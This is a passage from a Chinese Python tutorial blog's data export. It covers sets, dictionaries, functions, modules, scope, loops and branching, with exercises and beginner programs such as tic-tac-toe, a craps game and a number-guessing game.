range(1, 100) if num % 3 == 0 or num % 5 == 0} print(set4) 向集合添加元素和从集合删除元素。 set1.add(4) set1.add(5) set2.update([11, 12]) set2.discard(5) if 4 in set2: set2.remove(4) print(set1, set2) print(set3.pop()) print(set3) 集合的成员、交集、并集、差集等运算。 # 集合的交集、并集、差集、对称差运算 print(set1 &amp; set2) # print(set1.intersection(set2)) print(set1 | set2) # print(set1.union(set2)) print(set1 - set2) # print(set1.difference(set2)) print(set1 ^ set2) # print(set1.symmetric_difference(set2)) # 判断子集和超集 print(set2 &lt;= set1) # print(set2.issubset(set1)) print(set3 &lt;= set1) # print(set3.issubset(set1)) print(set1 &gt;= set2) # print(set1.issuperset(set2)) print(set1 &gt;= set3) # print(set1.issuperset(set3)) 说明： Python中允许通过一些特殊的方法来为某种类型或数据结构自定义运算符（后面的章节中会讲到），上面的代码中我们对集合进行运算的时候可以调用集合对象的方法，也可以直接使用对应的运算符，例如&amp;运算符跟intersection方法的作用就是一样的，但是使用运算符让代码更加直观。 使用字典字典是另一种可变容器模型，Python中的字典跟我们生活中使用的字典是一样一样的，它可以存储任意类型对象，与列表、集合不同的是，字典的每个元素都是由一个键和一个值组成的“键值对”，键和值通过冒号分开。下面的代码演示了如何定义和使用字典。 # 创建字典的字面量语法 scores = {'骆昊': 95, '白元芳': 78, '狄仁杰': 82} print(scores) # 创建字典的构造器语法 items1 = dict(one=1, two=2, three=3, four=4) # 通过zip函数将两个序列压成字典 items2 = dict(zip(['a', 'b', 'c'], '123')) # 创建字典的推导式语法 items3 = {num: num ** 2 for num in range(1, 10)} print(items1, items2, items3) # 通过键可以获取字典中对应的值 print(scores['骆昊']) print(scores['狄仁杰']) # 对字典中所有键值对进行遍历 for key in scores: print(f'{key}: {scores[key]}') # 更新字典中的元素 scores['白元芳'] = 65 scores['诸葛王朗'] = 71 scores.update(冷面=67, 方启鹤=85) print(scores) if '武则天' in scores: print(scores['武则天']) print(scores.get('武则天')) # get方法也是通过键获取对应的值但是可以设置默认值 print(scores.get('武则天', 60)) # 删除字典中的元素 print(scores.popitem()) print(scores.popitem()) print(scores.pop('骆昊', 100)) # 清空字典 scores.clear() print(scores) 练习练习1：在屏幕上显示跑马灯文字。参考答案： import os import time def main(): content = '北京欢迎你为你开天辟地…………' while True: # 清理屏幕上的输出 os.system('cls') # os.system('clear') print(content) # 休眠200毫秒 time.sleep(0.2) content = content[1:] + content[0] if __name__ == '__main__': main() 练习2：设计一个函数产生指定长度的验证码，验证码由大小写字母和数字构成。参考答案： import random def generate_code(code_len=4): \"\"\" 生成指定长度的验证码 :param code_len: 验证码的长度(默认4个字符) :return: 由大小写英文字母和数字构成的随机验证码 \"\"\" all_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' last_pos = len(all_chars) - 1 code = '' for _ in range(code_len): index = random.randint(0, last_pos) code += all_chars[index] return code 练习3：设计一个函数返回给定文件名的后缀名。参考答案： def get_suffix(filename, has_dot=False): \"\"\" 获取文件名的后缀名 :param filename: 文件名 :param has_dot: 返回的后缀名是否需要带点 :return: 文件的后缀名 \"\"\" pos = filename.rfind('.') if 0 &lt; pos &lt; len(filename) - 1: index = pos if has_dot else pos + 1 return filename[index:] else: return '' 练习4：设计一个函数返回传入的列表中最大和第二大的元素的值。参考答案： def max2(x): m1, m2 = (x[0], x[1]) if x[0] &gt; x[1] else (x[1], x[0]) for index in range(2, len(x)): if x[index] &gt; m1: m2 = m1 m1 = x[index] elif x[index] &gt; m2: m2 = x[index] return m1, m2 练习5：计算指定的年月日是这一年的第几天。参考答案： def is_leap_year(year): \"\"\" 判断指定的年份是不是闰年 :param year: 年份 :return: 闰年返回True平年返回False \"\"\" return year % 4 == 0 and year % 100 != 0 or year % 400 == 0 def which_day(year, month, date): \"\"\" 计算传入的日期是这一年的第几天 :param year: 年 :param month: 月 :param date: 日 :return: 第几天 \"\"\" days_of_month = [ [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31], [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31] ][is_leap_year(year)] total = 0 for index in range(month - 1): total += days_of_month[index] return total + date def main(): print(which_day(1980, 11, 28)) print(which_day(1981, 12, 31)) print(which_day(2018, 1, 1)) print(which_day(2016, 3, 1)) if __name__ == '__main__': main() 练习6：打印杨辉三角。参考答案： def main(): num = int(input('Number of rows: ')) yh = [[]] * num for row in range(len(yh)): yh[row] = [None] * (row + 1) for col in range(len(yh[row])): if col == 0 or col == row: yh[row][col] = 1 else: yh[row][col] = yh[row - 1][col] + yh[row - 1][col - 1] print(yh[row][col], end='\\t') print() if __name__ == '__main__': main() 综合案例案例1：双色球选号。from random import randrange, randint, sample def display(balls): \"\"\" 输出列表中的双色球号码 \"\"\" for index, ball in enumerate(balls): if index == len(balls) - 1: print('|', end=' ') print('%02d' % ball, end=' ') print() def random_select(): \"\"\" 随机选择一组号码 \"\"\" red_balls = [x for x in range(1, 34)] selected_balls = [] selected_balls = sample(red_balls, 6) selected_balls.sort() selected_balls.append(randint(1, 16)) return selected_balls def main(): n = int(input('机选几注: ')) for _ in range(n): display(random_select()) if __name__ == '__main__': main() 说明： 上面使用random模块的sample函数来实现从列表中选择不重复的n个元素。 综合案例2：约瑟夫环问题。\"\"\" 《幸运的基督徒》 有15个基督徒和15个非基督徒在海上遇险，为了能让一部分人活下来不得不将其中15个人扔到海里面去，有个人想了个办法就是大家围成一个圈，由某个人开始从1报数，报到9的人就扔到海里面，他后面的人接着从1开始报数，报到9的人继续扔到海里面，直到扔掉15个人。由于上帝的保佑，15个基督徒都幸免于难，问这些人最开始是怎么站的，哪些位置是基督徒哪些位置是非基督徒。 \"\"\" def main(): persons = [True] * 30 counter, index, number = 0, 0, 0 while counter &lt; 15: if persons[index]: number += 1 if number == 9: persons[index] = False counter += 1 number = 0 index += 1 index %= 30 for person in persons: print('基' if person else '非', end='') if __name__ == '__main__': main() 综合案例3：井字棋游戏。import os def print_board(board): print(board['TL'] + '|' + board['TM'] + '|' + board['TR']) print('-+-+-') print(board['ML'] + '|' + board['MM'] + '|' + board['MR']) print('-+-+-') print(board['BL'] + '|' + board['BM'] + '|' + board['BR']) def main(): init_board = { 'TL': ' ', 'TM': ' ', 'TR': ' ', 'ML': ' ', 'MM': ' ', 'MR': ' ', 'BL': ' ', 'BM': ' ', 'BR': ' ' } begin = True while begin: curr_board = init_board.copy() begin = False turn = 'x' counter = 0 os.system('clear') print_board(curr_board) while counter &lt; 9: move = input('轮到%s走棋, 请输入位置: ' % turn) if curr_board[move] == ' ': counter += 1 curr_board[move] = turn if turn == 'x': turn = 'o' else: turn = 'x' os.system('clear') print_board(curr_board) choice = input('再玩一局?(yes|no)') begin = choice == 'yes' if __name__ == '__main__': main() 说明： 最后这个案例来自《Python编程快速上手:让繁琐工作自动化》一书（这本书对有编程基础想迅速使用Python将日常工作自动化的人来说还是不错的选择），对代码做了一点点的调整。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"06函数和模块的使用","slug":"06函数和模块的使用","date":"2021-05-08T23:47:14.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/b3cfb221.html","link":"","permalink":"http://www.xiaocaibi.top/posts/b3cfb221.html","excerpt":"","text":"函数和模块的使用在讲解本章节的内容之前，我们先来研究一道数学题，请说出下面的方程有多少组正整数解。 事实上，上面的问题等同于将8个苹果分成四组每组至少一个苹果有多少种方案。想到这一点问题的答案就呼之欲出了。 可以用Python的程序来计算出这个值，代码如下所示。 \"\"\" 输入M和N计算C(M,N) \"\"\" m = int(input('m = ')) n = int(input('n = ')) fm = 1 for num in range(1, m + 1): fm *= num fn = 1 for num in range(1, n + 1): fn *= num fm_n = 1 for num in range(1, m - n + 1): fm_n *= num print(fm // fn // fm_n) 函数的作用不知道大家是否注意到，在上面的代码中，我们做了3次求阶乘，这样的代码实际上就是重复代码。编程大师Martin Fowler先生曾经说过：“代码有很多种坏味道，重复是最坏的一种！”，要写出高质量的代码首先要解决的就是重复代码的问题。对于上面的代码来说，我们可以将计算阶乘的功能封装到一个称之为“函数”的功能模块中，在需要计算阶乘的地方，我们只需要“调用”这个“函数”就可以了。 定义函数在Python中可以使用def关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过return关键字来返回一个值，这相当于数学上说的函数的因变量。 在了解了如何定义函数后，我们可以对上面的代码进行重构，所谓重构就是在不影响代码执行结果的前提下对代码的结构进行调整，重构之后的代码如下所示。 \"\"\" 输入M和N计算C(M,N) Version: 0.1 Author: 骆昊 \"\"\" def fac(num): \"\"\"求阶乘\"\"\" result = 1 for n in range(1, num + 1): result *= n return result m = int(input('m = ')) n = int(input('n = ')) # 当需要计算阶乘的时候不用再写循环求阶乘而是直接调用已经定义好的函数 print(fac(m) // fac(n) // fac(m - n)) 说明： Python的math模块中其实已经有一个名为factorial函数实现了阶乘运算，事实上求阶乘并不用自己定义函数。下面的例子中，我们讲的函数在Python标准库已经实现过了，我们这里是为了讲解函数的定义和使用才把它们又实现了一遍，实际开发中并不建议做这种低级的重复劳动。 函数的参数函数是绝大多数编程语言中都支持的一个代码的\"构建块\"，但是Python中的函数与其他语言中的函数还是有很多不太相同的地方，其中一个显著的区别就是Python对函数参数的处理。在Python中，函数的参数可以有默认值，也支持使用可变参数，所以Python并不需要像其他语言一样支持函数的重载，因为我们在定义一个函数的时候可以让它有多种不同的使用方式，下面是两个小例子。 from random import randint def roll_dice(n=2): \"\"\"摇色子\"\"\" total = 0 for _ in range(n): total += randint(1, 6) return total def add(a=0, b=0, c=0): \"\"\"三个数相加\"\"\" return a + b + c # 如果没有指定参数那么使用默认值摇两颗色子 print(roll_dice()) # 摇三颗色子 print(roll_dice(3)) print(add()) print(add(1)) print(add(1, 2)) print(add(1, 2, 3)) # 传递参数时可以不按照设定的顺序进行传递 print(add(c=50, a=100, b=200)) 我们给上面两个函数的参数都设定了默认值，这也就意味着如果在调用函数的时候如果没有传入对应参数的值时将使用该参数的默认值，所以在上面的代码中我们可以用各种不同的方式去调用add函数，这跟其他很多语言中函数重载的效果是一致的。 其实上面的add函数还有更好的实现方案，因为我们可能会对0个或多个参数进行加法运算，而具体有多少个参数是由调用者来决定，我们作为函数的设计者对这一点是一无所知的，因此在不确定参数个数的时候，我们可以使用可变参数，代码如下所示。 # 在参数名前面的*表示args是一个可变参数 def add(*args): total = 0 for val in args: total += val return total # 在调用add函数时可以传入0个或多个参数 print(add()) print(add(1)) print(add(1, 2)) print(add(1, 2, 3)) print(add(1, 3, 5, 7, 9)) 用模块管理函数对于任何一种编程语言来说，给变量、函数这样的标识符起名字都是一个让人头疼的问题，因为我们会遇到命名冲突这种尴尬的情况。最简单的场景就是在同一个.py文件中定义了两个同名函数，由于Python没有函数重载的概念，那么后面的定义会覆盖之前的定义，也就意味着两个函数同名函数实际上只有一个是存在的。 def foo(): print('hello, world!') def foo(): print('goodbye, world!') # 下面的代码会输出什么呢？ foo() 当然上面的这种情况我们很容易就能避免，但是如果项目是由多人协作进行团队开发的时候，团队中可能有多个程序员都定义了名为foo的函数，那么怎么解决这种命名冲突呢？答案其实很简单，Python中每个文件就代表了一个模块（module），我们在不同的模块中可以有同名的函数，在使用函数的时候我们通过import关键字导入指定的模块就可以区分到底要使用的是哪个模块中的foo函数，代码如下所示。 module1.py def foo(): print('hello, world!') module2.py def foo(): print('goodbye, world!') test.py from module1 import foo # 输出hello, world! foo() from module2 import foo # 输出goodbye, world! foo() 也可以按照如下所示的方式来区分到底要使用哪一个foo函数。 test.py import module1 as m1 import module2 as m2 m1.foo() m2.foo() 但是如果将代码写成了下面的样子，那么程序中调用的是最后导入的那个foo，因为后导入的foo覆盖了之前导入的foo。 test.py from module1 import foo from module2 import foo # 输出goodbye, world! foo() test.py from module2 import foo from module1 import foo # 输出hello, world! foo() 需要说明的是，如果我们导入的模块除了定义函数之外还中有可以执行代码，那么Python解释器在导入这个模块时就会执行这些代码，事实上我们可能并不希望如此，因此如果我们在模块中编写了执行代码，最好是将这些执行代码放入如下所示的条件中，这样的话除非直接运行该模块，if条件下的这些代码是不会执行的，因为只有直接执行的模块的名字才是\"__main__\"。 module3.py def foo(): pass def bar(): pass # __name__是Python中一个隐含的变量它代表了模块的名字 # 只有被Python解释器直接执行的模块的名字才是__main__ if __name__ == '__main__': print('call foo()') foo() print('call bar()') bar() test.py import module3 # 导入module3时 不会执行模块中if条件成立时的代码 因为模块的名字是module3而不是__main__ 练习练习1：实现计算求最大公约数和最小公倍数的函数。参考答案： def gcd(x, y): \"\"\"求最大公约数\"\"\" (x, y) = (y, x) if x &gt; y else (x, y) for factor in range(x, 0, -1): if x % factor == 0 and y % factor == 0: return factor def lcm(x, y): \"\"\"求最小公倍数\"\"\" return x * y // gcd(x, y) 练习2：实现判断一个数是不是回文数的函数。参考答案： def is_palindrome(num): \"\"\"判断一个数是不是回文数\"\"\" temp = num total = 0 while temp &gt; 0: total = total * 10 + temp % 10 temp //= 10 return total == num 练习3：实现判断一个数是不是素数的函数。参考答案： def is_prime(num): \"\"\"判断一个数是不是素数\"\"\" for factor in range(2, int(num ** 0.5) + 1): if num % factor == 0: return False return True if num != 1 else False 练习4：写一个程序判断输入的正整数是不是回文素数。参考答案： if __name__ == '__main__': num = int(input('请输入正整数: ')) if is_palindrome(num) and is_prime(num): print('%d是回文素数' % num) 注意：通过上面的程序可以看出，当我们将代码中重复出现的和相对独立的功能抽取成函数后，我们可以组合使用这些函数来解决更为复杂的问题，这也是我们为什么要定义和使用函数的一个非常重要的原因。 变量的作用域最后，我们来讨论一下Python中有关变量作用域的问题。 def foo(): b = 'hello' # Python中可以在函数内部再定义函数 def bar(): c = True print(a) print(b) print(c) bar() # print(c) # NameError: name 'c' is not defined if __name__ == '__main__': a = 100 # print(b) # NameError: name 'b' is not defined foo() 上面的代码能够顺利的执行并且打印出100、hello和True，但我们注意到了，在bar函数的内部并没有定义a和b两个变量，那么a和b是从哪里来的。我们在上面代码的if分支中定义了一个变量a，这是一个全局变量（global variable），属于全局作用域，因为它没有定义在任何一个函数中。在上面的foo函数中我们定义了变量b，这是一个定义在函数中的局部变量（local variable），属于局部作用域，在foo函数的外部并不能访问到它；但对于foo函数内部的bar函数来说，变量b属于嵌套作用域，在bar函数中我们是可以访问到它的。bar函数中的变量c属于局部作用域，在bar函数之外是无法访问的。事实上，Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索，前三者我们在上面的代码中已经看到了，所谓的“内置作用域”就是Python内置的那些标识符，我们之前用过的input、print、int等都属于内置作用域。 再看看下面这段代码，我们希望通过函数调用修改全局变量a的值，但实际上下面的代码是做不到的。 def foo(): a = 200 print(a) # 200 if __name__ == '__main__': a = 100 foo() print(a) # 100 在调用foo函数后，我们发现a的值仍然是100，这是因为当我们在函数foo中写a = 200的时候，是重新定义了一个名字为a的局部变量，它跟全局作用域的a并不是同一个变量，因为局部作用域中有了自己的变量a，因此foo函数不再搜索全局作用域中的a。如果我们希望在foo函数中修改全局作用域中的a，代码如下所示。 def foo(): global a a = 200 print(a) # 200 if __name__ == '__main__': a = 100 foo() print(a) # 200 我们可以使用global关键字来指示foo函数中的变量a来自于全局作用域，如果全局作用域中没有a，那么下面一行的代码就会定义变量a并将其置于全局作用域。同理，如果我们希望函数内部的函数能够修改嵌套作用域中的变量，可以使用nonlocal关键字来指示变量来自于嵌套作用域，请大家自行试验。 在实际开发中，我们应该尽量减少对全局变量的使用，因为全局变量的作用域和影响过于广泛，可能会发生意料之外的修改和使用，除此之外全局变量比局部变量拥有更长的生命周期，可能导致对象占用的内存长时间无法被垃圾回收。事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对迪米特法则的践行。减少全局变量的使用就意味着我们应该尽量让变量的作用域在函数的内部，但是如果我们希望将一个局部变量的生命周期延长，使其在定义它的函数调用结束后依然可以使用它的值，这时候就需要使用闭包，这个我们在后续的内容中进行讲解。 说明： 很多人经常会将“闭包”和“匿名函数”混为一谈，但实际上它们并不是一回事，如果想了解这个概念，可以看看维基百科的解释或者知乎上对这个概念的讨论。 说了那么多，其实结论很简单，从现在开始我们可以将Python代码按照下面的格式进行书写，这一点点的改进其实就是在我们理解了函数和作用域的基础上跨出的巨大的一步。 def main(): # Todo: Add your code here pass if __name__ == '__main__': main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"05构造程序逻辑","slug":"05构造程序逻辑","date":"2021-05-08T00:50:57.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/7185fe7.html","link":"","permalink":"http://www.xiaocaibi.top/posts/7185fe7.html","excerpt":"","text":"构造程序逻辑学完前面的几个章节后，我觉得有必要在这里带大家做一些练习来巩固之前所学的知识，虽然迄今为止我们学习的内容只是Python的冰山一角，但是这些内容已经足够我们来构建程序中的逻辑。对于编程语言的初学者来说，在学习了Python的核心语言元素（变量、类型、运算符、表达式、分支结构、循环结构等）之后，必须做的一件事情就是尝试用所学知识去解决现实中的问题，换句话说就是锻炼自己把用人类自然语言描述的算法（解决问题的方法和步骤）翻译成Python代码的能力，而这件事情必须通过大量的练习才能达成。 我们在本章为大家整理了一些经典的案例和习题，希望通过这些例子，一方面帮助大家巩固之前所学的Python知识，另一方面帮助大家了解如何建立程序中的逻辑以及如何运用一些简单的算法解决现实中的问题。 经典的例子 寻找水仙花数。 说明：水仙花数也被称为超完全数字不变数、自恋数、自幂数、阿姆斯特朗数，它是一个3位数，该数字每个位上数字的立方之和正好等于它本身，例如：$1^3 + 5^3+ 3^3=153$。 \"\"\" 找出所有水仙花数 \"\"\" for num in range(100, 1000): low = num % 10 mid = num // 10 % 10 high = num // 100 if num == low ** 3 + mid ** 3 + high ** 3: print(num) 在上面的代码中，我们通过整除和求模运算分别找出了一个三位数的个位、十位和百位，这种小技巧在实际开发中还是常用的。用类似的方法，我们还可以实现将一个正整数反转，例如：将12345变成54321，代码如下所示。 \"\"\" 正整数的反转 \"\"\" num = int(input('num = ')) reversed_num = 0 while num &gt; 0: reversed_num = reversed_num * 10 + num % 10 num //= 10 print(reversed_num) 百钱百鸡问题。 说明：百钱百鸡是我国古代数学家张丘建在《算经》一书中提出的数学问题：鸡翁一值钱五，鸡母一值钱三，鸡雏三值钱一。百钱买百鸡，问鸡翁、鸡母、鸡雏各几何？翻译成现代文是：公鸡5元一只，母鸡3元一只，小鸡1元三只，用100块钱买一百只鸡，问公鸡、母鸡、小鸡各有多少只？ \"\"\" 《百钱百鸡》问题 \"\"\" for x in range(0, 20): for y in range(0, 33): z = 100 - x - y if 5 * x + 3 * y + z / 3 == 100: print('公鸡: %d只, 母鸡: %d只, 小鸡: %d只' % (x, y, z)) 上面使用的方法叫做穷举法，也称为暴力搜索法，这种方法通过一项一项的列举备选解决方案中所有可能的候选项并检查每个候选项是否符合问题的描述，最终得到问题的解。这种方法看起来比较笨拙，但对于运算能力非常强大的计算机来说，通常都是一个可行的甚至是不错的选择，而且问题的解如果存在，这种方法一定能够找到它。 CRAPS赌博游戏。 说明：CRAPS又称花旗骰，是美国拉斯维加斯非常受欢迎的一种的桌上赌博游戏。该游戏使用两粒骰子，玩家通过摇两粒骰子获得点数进行游戏。简单的规则是：玩家第一次摇骰子如果摇出了7点或11点，玩家胜；玩家第一次如果摇出2点、3点或12点，庄家胜；其他点数玩家继续摇骰子，如果玩家摇出了7点，庄家胜；如果玩家摇出了第一次摇的点数，玩家胜；其他点数，玩家继续要骰子，直到分出胜负。 \"\"\" Craps赌博游戏 我们设定玩家开始游戏时有1000元的赌注 游戏结束的条件是玩家输光所有的赌注 \"\"\" from random import randint money = 1000 while money &gt; 0: print('你的总资产为:', money) needs_go_on = False while True: debt = int(input('请下注: ')) if 0 &lt; debt &lt;= money: break first = randint(1, 6) + randint(1, 6) print('玩家摇出了%d点' % first) if first == 7 or first == 11: print('玩家胜!') money += debt elif first == 2 or first == 3 or first == 12: print('庄家胜!') money -= debt else: needs_go_on = True while needs_go_on: needs_go_on = False current = randint(1, 6) + randint(1, 6) print('玩家摇出了%d点' % current) if current == 7: print('庄家胜') money -= debt elif current == first: print('玩家胜') money += debt else: needs_go_on = True print('你破产了, 游戏结束!') ###有用的练习 生成斐波那契数列的前20个数。 说明：斐波那契数列（Fibonacci sequence），又称黄金分割数列，是意大利数学家莱昂纳多·斐波那契（Leonardoda Fibonacci）在《计算之书》中提出一个在理想假设条件下兔子成长率的问题而引入的数列，所以这个数列也被戏称为\"兔子数列\"。斐波那契数列的特点是数列的前两个数都是1，从第三个数开始，每个数都是它前面两个数的和，形如：1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, …。斐波那契数列在现代物理、准晶体结构、化学等领域都有直接的应用。 找出10000以内的完美数。 说明：完美数又称为完全数或完备数，它的所有的真因子（即除了自身以外的因子）的和（即因子函数）恰好等于它本身。例如：6（$6=1+2+3$）和28（$28=1+2+4+7+14$）就是完美数。完美数有很多神奇的特性，有兴趣的可以自行了解。 输出100以内所有的素数。 说明：素数指的是只能被1和自身整除的正整数（不包括1）。 上面练习的参考答案在本章对应的代码目录中，如果需要帮助请读者自行查看参考答案。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"04循环结构","slug":"04循环结构","date":"2021-05-07T00:40:51.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/1cc2c928.html","link":"","permalink":"http://www.xiaocaibi.top/posts/1cc2c928.html","excerpt":"","text":"循环结构应用场景我们在写程序的时候，一定会遇到需要重复执行某条或某些指令的场景。例如用程序控制机器人踢足球，如果机器人持球而且还没有进入射门范围，那么我们就要一直发出让机器人向球门方向移动的指令。在这个场景中，让机器人向球门方向移动就是一个需要重复的动作，当然这里还会用到上一课讲的分支结构来判断机器人是否持球以及是否进入射门范围。再举一个简单的例子，如果要实现每隔1秒中在屏幕上打印一次“hello, world”并持续打印一个小时，我们肯定不能够直接把print('hello, world')这句代码写3600遍，这里同样需要循环结构。 循环结构就是程序中控制某条或某些指令重复执行的结构。在Python中构造循环结构有两种做法，一种是for-in循环，一种是while循环。 for-in循环如果明确的知道循环执行的次数或者要对一个容器进行迭代（后面会讲到），那么我们推荐使用for-in循环，例如下面代码中计算1~100求和的结果（$\\displaystyle \\sum \\limits_{n=1}^{100}n$）。 \"\"\" 用for循环实现1~100求和 \"\"\" sum = 0 for x in range(101): sum += x print(sum) 需要说明的是上面代码中的range(1, 101)可以用来构造一个从1到100的范围，当我们把这样一个范围放到for-in循环中，就可以通过前面的循环变量x依次取出从1到100的整数。当然，range的用法非常灵活，下面给出了一个例子： range(101)：可以用来产生0到100范围的整数，需要注意的是取不到101。 range(1, 101)：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。 range(1, 101, 2)：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。 range(100, 0, -2)：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。 知道了这一点，我们可以用下面的代码来实现1~100之间的偶数求和。 \"\"\" 用for循环实现1~100之间的偶数求和 \"\"\" sum = 0 for x in range(2, 101, 2): sum += x print(sum) 当然，也可以通过在循环中使用分支结构的方式来实现相同的功能，代码如下所示。 \"\"\" 用for循环实现1~100之间的偶数求和 \"\"\" sum = 0 for x in range(1, 101): if x % 2 == 0: sum += x print(sum) 说明：相较于上面直接跳过奇数的做法，下面这种做法很明显并不是很好的选择。 while循环如果要构造不知道具体循环次数的循环结构，我们推荐使用while循环。while循环通过一个能够产生或转换出bool值的表达式来控制循环，表达式的值为True则继续循环；表达式的值为False则结束循环。 下面我们通过一个“猜数字”的小游戏来看看如何使用while循环。猜数字游戏的规则是：计算机出一个1到100之间的随机数，玩家输入自己猜的数字，计算机给出对应的提示信息（大一点、小一点或猜对了），如果玩家猜中了数字，计算机提示用户一共猜了多少次，游戏结束，否则游戏继续。 \"\"\" 猜数字游戏 \"\"\" import random answer = random.randint(1, 100) counter = 0 while True: counter += 1 number = int(input('请输入: ')) if number &lt; answer: print('大一点') elif number &gt; answer: print('小一点') else: print('恭喜你猜对了!') break print('你总共猜了%d次' % counter) if counter &gt; 7: print('你的智商余额明显不足') 上面的代码中使用了break关键字来提前终止循环，需要注意的是break只能终止它所在的那个循环，这一点在使用嵌套的循环结构（下面会讲到）需要引起注意。除了break之外，还有另一个关键字是continue，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。 和分支结构一样，循环结构也是可以嵌套的，也就是说在循环中还可以构造循环结构。下面的例子演示了如何通过嵌套的循环来输出一个九九乘法表。 \"\"\" 输出乘法口诀表(九九表) \"\"\" for i in range(1, 10): for j in range(1, i + 1): print('%d*%d=%d' % (i, j, i * j), end='\\t') print() 练习练习1：输入一个正整数判断是不是素数。 提示：素数指的是只能被1和自身整除的大于1的整数。 参考答案： \"\"\" 输入一个正整数判断它是不是素数 \"\"\" from math import sqrt num = int(input('请输入一个正整数: ')) end = int(sqrt(num)) is_prime = True for x in range(2, end + 1): if num % x == 0: is_prime = False break if is_prime and num != 1: print('%d是素数' % num) else: print('%d不是素数' % num) 练习2：输入两个正整数，计算它们的最大公约数和最小公倍数。 提示：两个数的最大公约数是两个数的公共因子中最大的那个数；两个数的最小公倍数则是能够同时被两个数整除的最小的那个数。 参考答案： \"\"\" 输入两个正整数计算它们的最大公约数和最小公倍数 \"\"\" x = int(input('x = ')) y = int(input('y = ')) # 如果x大于y就交换x和y的值 if x &gt; y: # 通过下面的操作将y的值赋给x, 将x的值赋给y x, y = y, x # 从两个数中较的数开始做递减的循环 for factor in range(x, 0, -1): if x % factor == 0 and y % factor == 0: print('%d和%d的最大公约数是%d' % (x, y, factor)) print('%d和%d的最小公倍数是%d' % (x, y, x * y // factor)) break 练习3：打印如下所示的三角形图案。* ** *** **** ***** * ** *** **** ***** * *** ***** ******* ********* 参考答案： \"\"\" 打印三角形图案 \"\"\" row = int(input('请输入行数: ')) for i in range(row): for _ in range(i + 1): print('*', end='') print() for i in range(row): for j in range(row): if j &lt; row - i - 1: print(' ', end='') else: print('*', end='') print() for i in range(row): for _ in range(row - i - 1): print(' ', end='') for _ in range(2 * i + 1): print('*', end='') print()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://www.xiaocaibi.top/tags/python/"}]},{"title":"03分支结构","slug":"03分支结构","date":"2021-05-06T14:47:57.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/e0f94d1.html","link":"","permalink":"http://www.xiaocaibi.top/posts/e0f94d1.html","excerpt":"","text":"分支结构应用场景迄今为止，我们写的Python代码都是一条一条语句顺序执行，这种代码结构通常称之为顺序结构。然而仅有顺序结构并不能解决所有的问题，比如我们设计一个游戏，游戏第一关的通关条件是玩家获得1000分，那么在完成本局游戏后，我们要根据玩家得到分数来决定究竟是进入第二关，还是告诉玩家“Game Over”，这里就会产生两个分支，而且这两个分支只有一个会被执行。类似的场景还有很多，我们将这种结构称之为“分支结构”或“选择结构”。给大家一分钟的时间，你应该可以想到至少5个以上这样的例子，赶紧试一试。 if语句的使用在Python中，要构造分支结构可以使用if、elif和else关键字。所谓关键字就是有特殊含义的单词，像if和else就是专门用于构造分支结构的关键字，很显然你不能够使用它作为变量名（事实上，用作其他的标识符也是不可以）。下面的例子中演示了如何构造一个分支结构。 \"\"\" 用户身份验证 \"\"\" username = input('请输入用户名: ') password = input('请输入口令: ') # 用户名是admin且密码是123456则身份验证成功否则身份验证失败 if username == 'admin' and password == '123456': print('身份验证成功!') else: print('身份验证失败!') 需要说明的是和C/C++、Java等语言不同，Python中没有用花括号来构造代码块而是使用了缩进的方式来表示代码的层次结构，如果if条件成立的情况下需要执行多条语句，只要保持多条语句具有相同的缩进就可以了。换句话说连续的代码如果又保持了相同的缩进那么它们属于同一个代码块，相当于是一个执行的整体。缩进可以使用任意数量的空格，但通常使用4个空格，建议大家不要使用制表键或者设置你的代码编辑工具自动将制表键变成4个空格。 当然如果要构造出更多的分支，可以使用if...elif...else...结构或者嵌套的if...else...结构，下面的代码演示了如何利用多分支结构实现分段函数求值。 \"\"\" 分段函数求值 3x - 5 (x &gt; 1) f(x) = x + 2 (-1 &lt;= x &lt;= 1) 5x + 3 (x &lt; -1) \"\"\" x = float(input('x = ')) if x &gt; 1: y = 3 * x - 5 elif x &gt;= -1: y = x + 2 else: y = 5 * x + 3 print('f(%.2f) = %.2f' % (x, y)) 当然根据实际开发的需要，分支结构是可以嵌套的，例如判断是否通关以后还要根据你获得的宝物或者道具的数量对你的表现给出等级（比如点亮两颗或三颗星星），那么我们就需要在if的内部构造出一个新的分支结构，同理elif和else中也可以再构造新的分支，我们称之为嵌套的分支结构，也就是说上面的代码也可以写成下面的样子。 \"\"\" 分段函数求值 3x - 5 (x &gt; 1) f(x) = x + 2 (-1 &lt;= x &lt;= 1) 5x + 3 (x &lt; -1) \"\"\" x = float(input('x = ')) if x &gt; 1: y = 3 * x - 5 else: if x &gt;= -1: y = x + 2 else: y = 5 * x + 3 print('f(%.2f) = %.2f' % (x, y)) 说明： 大家可以自己感受一下这两种写法到底是哪一种更好。在之前我们提到的Python之禅中有这么一句话“Flat is better than nested.”，之所以提倡代码“扁平化”是因为嵌套结构的嵌套层次多了之后会严重的影响代码的可读性，所以能使用扁平化的结构时就不要使用嵌套。 练习练习1：英制单位英寸与公制单位厘米互换。参考答案： \"\"\" 英制单位英寸和公制单位厘米互换 \"\"\" value = float(input('请输入长度: ')) unit 